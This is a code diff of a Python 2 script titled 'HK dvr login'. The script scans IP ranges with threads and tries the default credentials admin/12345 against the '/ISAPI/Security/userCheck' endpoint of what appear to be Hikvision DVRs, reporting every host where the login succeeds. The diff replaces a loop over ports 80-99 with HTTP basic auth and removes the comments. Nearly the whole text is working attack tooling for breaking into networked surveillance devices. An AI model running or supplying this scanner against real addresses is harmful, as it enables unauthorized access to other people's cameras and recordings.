@@ -10,20 +10,20 @@ import Queue
 import sys
 import re
 
-#ip to num
+
 def ip2num(ip):
     ip = [int(x) for x in ip.split('.')]
     return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3]
 
-#num to ip
+
 def num2ip(num):
     return '%s.%s.%s.%s' % ((num & 0xff000000) >> 24,(num & 0x00ff0000) >> 16,(num & 0x0000ff00) >> 8,num & 0x000000ff)
 
-#get list
+
 def ip_range(start, end):
     return [num2ip(num) for num in range(ip2num(start), ip2num(end) + 1) if num & 0xff]
 
-#main function
+
 def bThread(iplist):
 
     threadl = []
@@ -39,7 +39,7 @@ def bThread(iplist):
     for t in threadl:
         t.join()
 
-#create thread
+
 class tThread(threading.Thread):
     def __init__(self, queue):
         threading.Thread.__init__(self)
@@ -55,19 +55,20 @@ class tThread(threading.Thread):
                 continue
 
 def getinfo(host):
+
     username = "admin"
     password = "12345"
     timeout = 5
+    url_login = host + '/ISAPI/Security/userCheck'
 
-    for port in range(80,100):
-        try:
-            req = requests.get(url='http://'+ username +':'+ password +'@'+ host +':'+ str(port) +'/ISAPI/Security/userCheck',timeout=timeout)
-            result = req.text
-            status = re.findall(r'<statusValue>(.*)</statusValue>', result)
-            if status[0] == '200':
-                print '[√] Host http://'+ host +':'+ str(port) +' Login Success!'
-        except:
-            pass
+    try:
+        req = requests.get(url=url_login, auth=(username, password), timeout=timeout)
+        result = req.text
+        status = re.findall(r'<statusValue>(.*)</statusValue>', result)
+        if status[0] == '200':
+            print '[√] Host http://' + host + ' Login Success!'
+    except:
+        pass
 
 if __name__ == '__main__':
     print '\n*************** HK dvr login ****************'
